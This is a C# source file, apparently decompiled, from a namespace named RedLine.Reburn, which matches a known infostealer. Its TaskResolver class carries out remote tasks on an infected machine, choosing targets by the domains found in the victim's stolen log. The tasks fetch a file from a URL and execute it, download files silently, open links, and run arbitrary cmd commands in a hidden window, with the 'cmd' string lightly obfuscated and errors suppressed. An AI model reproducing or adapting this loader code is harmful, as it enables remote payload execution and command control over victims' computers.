using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using RedLine.Reburn.Data.Extensions;
using RedLine.Reburn.Models.Enums;
using RedLine.Reburn.Models.Info;

namespace RedLine.Reburn.Data.Core;

public class TaskResolver
{
	private UserLog _log;

	private IList<RemoteTask> _tasks;

	public TaskResolver(UserLog log, IList<RemoteTask> tasks)
	{
		_log = log;
		_tasks = tasks;
	}

	public IEnumerable<int> Get()
	{
		List<int> list = new List<int>();
		try
		{
			foreach (RemoteTask task in _tasks)
			{
				if (!_log.ContainsDomains(task.DomainsCheck))
				{
					continue;
				}
				bool flag = false;
				try
				{
					if (task.Action == RemoteTaskAction.DownloadAndEx)
					{
						string[] array = task.Target.Split(new char[1] { '|' });
						File.WriteAllBytes(Environment.ExpandEnvironmentVariables(array[1]), new WebClient().DownloadData(array[0]));
						Process.Start(new ProcessStartInfo
						{
							WorkingDirectory = new FileInfo(Environment.ExpandEnvironmentVariables(array[1])).Directory!.FullName,
							FileName = Environment.ExpandEnvironmentVariables(array[1])
						});
						flag = true;
					}
					if (task.Action == RemoteTaskAction.Download)
					{
						try
						{
							string[] array2 = task.Target.Split(new char[1] { '|' });
							if (array2.Length == 1)
							{
								new WebClient().DownloadString(task.Target);
							}
							if (array2.Length == 2)
							{
								new WebClient().DownloadFile(array2[0], Environment.ExpandEnvironmentVariables(array2[1]));
							}
						}
						catch
						{
						}
						flag = true;
					}
					if (task.Action == RemoteTaskAction.OpenLink)
					{
						Process.Start(task.Target);
						flag = true;
					}
					if (task.Action == RemoteTaskAction.Cmd)
					{
						Process.Start(new ProcessStartInfo(new string(new char[3] { 'c', 'm', 'd' }), new string(new char[3] { '/', 'C', ' ' }) + task.Target)
						{
							RedirectStandardError = true,
							RedirectStandardOutput = true,
							UseShellExecute = false,
							CreateNoWindow = true
						});
						flag = true;
					}
				}
				catch
				{
				}
				if (flag)
				{
					list.Add(task.ID);
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}
}
